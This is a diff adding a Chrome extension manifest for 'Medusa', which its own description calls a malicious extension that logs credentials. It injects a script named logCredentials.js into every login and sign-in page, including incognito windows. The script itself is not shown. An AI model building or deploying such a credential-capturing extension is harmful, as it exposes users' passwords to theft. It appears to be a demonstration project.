@@ -1,0 +1,69 @@
+{
+  	// Required
+  	"manifest_version": 3,
+  	"name": "Medusa",
+  	"version": "1.0",
+
+  	// Recommended
+  	"description": "A simple malicious extension that logs your credentials to the console. :)",
+	"icons": {
+		"16": "./icons/medusa_16x16.png",
+	  	"128": "./icons/medusa_128x128.png",
+	  	"256": "./icons/medusa_256x256.png",
+	  	"512": "./icons/medusa_512x512.png"
+	},
+
+	// Optional
+	"content_scripts": [{
+		"matches": [
+			"*://*/*login*",
+			"*://*/*signin*",
+			"*://*/*Login*",
+			"*://*/*SignIn*"
+		],
+		"js": ["./js/logCredentials.js"]
+	}],
+	"incognito": "spanning"
+}
+
+//  // Optional
+//  "author": "developer@example.com",
+//  "automation": {...},
+//  "background": {...},
+//  "chrome_settings_overrides": {...},
+//  "chrome_url_overrides": {...},
+//  "commands": {...},
+//  "content_scripts": [{...}],
+//  "content_security_policy": {...},
+//  "cross_origin_embedder_policy": {...},
+//  "cross_origin_opener_policy": {...},
+//  "declarative_net_request": {...},
+//  "devtools_page": "devtools.html",
+//  "event_rules": [{...}],
+//  "export": {...},
+//  "externally_connectable": {...},
+//  "file_browser_handlers": [...],
+//  "file_system_provider_capabilities": {...},
+//  "homepage_url": "https://path/to/homepage",
+//  "host_permissions": [...],
+//  "import": [{...}],
+//  "input_components": [{...}],
+//  "key": "publicKey",
+//  "minimum_chrome_version": "107",
+//  "nacl_modules": [...],
+//  "oauth2": {...},
+//  "omnibox": {...},
+//  "optional_host_permissions": ["..."],
+//  "optional_permissions": ["..."],
+//  "options_page": "options.html",
+//  "options_ui": {...},
+//  "permissions": ["..."],
+//  "requirements": {...},
+//  "sandbox": {...},
+//  "short_name": "Short Name",
+//  "storage": {...},
+//  "tts_engine": {...},
+//  "update_url": "https://path/to/updateInfo.xml",
+//  "version_name": "1.0 beta",
+//  "web_accessible_resources": [...]
+//}
